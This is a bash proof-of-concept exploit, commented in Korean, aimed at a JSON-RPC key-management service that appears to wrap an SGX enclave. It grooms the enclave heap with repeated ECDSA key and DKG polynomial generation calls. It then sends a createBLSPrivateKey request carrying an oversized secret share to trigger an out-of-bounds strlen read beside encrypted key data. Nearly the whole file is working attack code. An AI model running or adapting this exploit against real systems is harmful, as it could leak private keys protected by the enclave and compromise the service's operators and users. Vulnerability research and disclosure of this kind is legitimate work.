#!/bin/bash
# PoC: 힙 레이아웃 조작으로 strlen OOB 확장
# 전략: createBLSPrivateKey 직전에 ecall을 연속 호출해서
#       enclave 힙에 암호화된 키 데이터를 쌓아두면
#       malloc(6145) 뒤에 그 데이터가 위치할 수 있음

HOST=${1:-localhost}
PORT=${2:-1029}
URL="http://${HOST}:${PORT}"

rpc() {
    curl -s --max-time 5 -X POST "$URL" \
        -H 'Content-Type: application/json' \
        --data-binary @-
}

echo "[*] Target: $URL"

# Step 1: ECDSA key 생성 (enclave 힙 워밍업 + 데이터 배치)
echo "[*] Step 1: Generating multiple ECDSA keys to prime enclave heap..."
for i in $(seq 1 5); do
    RSP=$(rpc <<'EOF'
{"jsonrpc":"2.0","id":1,"method":"generateECDSAKey","params":{}}
EOF
    )
    STATUS=$(echo "$RSP" | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['status'])" 2>/dev/null)
    echo "    Key $i: status=$STATUS"
done

# Step 2: generateDKGPoly 여러 번 (힙 fragmentation 유도)
echo "[*] Step 2: Generating DKG polys to fragment heap..."
for i in $(seq 1 3); do
    POLY="POLY:SCHAIN_ID:${i}:NODE_ID:1:DKG_ID:1"
    rpc <<EOF > /dev/null
{"jsonrpc":"2.0","id":2,"method":"generateDKGPoly","params":{"polyName":"$POLY","t":1}}
EOF
    echo "    Poly $i done"
done

# Step 3: 마지막으로 ECDSA key 생성 (poc_shares malloc 직전 힙 상태 만들기)
echo "[*] Step 3: Final ECDSA key (target for heap adjacency)..."
RSP=$(rpc <<'EOF'
{"jsonrpc":"2.0","id":1,"method":"generateECDSAKey","params":{}}
EOF
)
ETH_KEY=$(echo "$RSP" | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['keyName'])")
echo "    ethKeyName = $ETH_KEY"

# Step 4: createBLSPrivateKey 트리거
POLY_NAME="POLY:SCHAIN_ID:1:NODE_ID:1:DKG_ID:1"
SECRET=$(printf 'A%.0s' {1..192})
BLS_KEY_NAME="BLS_KEY:SCHAIN_ID:99:NODE_ID:1:DKG_ID:1"

echo "[*] Step 4: Triggering OOB read after heap priming..."
RSP=$(rpc <<EOF
{
    "jsonrpc": "2.0",
    "id": 3,
    "method": "createBLSPrivateKey",
    "params": {
        "blsKeyName":  "$BLS_KEY_NAME",
        "ethKeyName":  "$ETH_KEY",
        "polyName":    "$POLY_NAME",
        "secretShare": "$SECRET",
        "t": 1,
        "n": 1
    }
}
EOF
)
echo "[*] Response: $RSP"
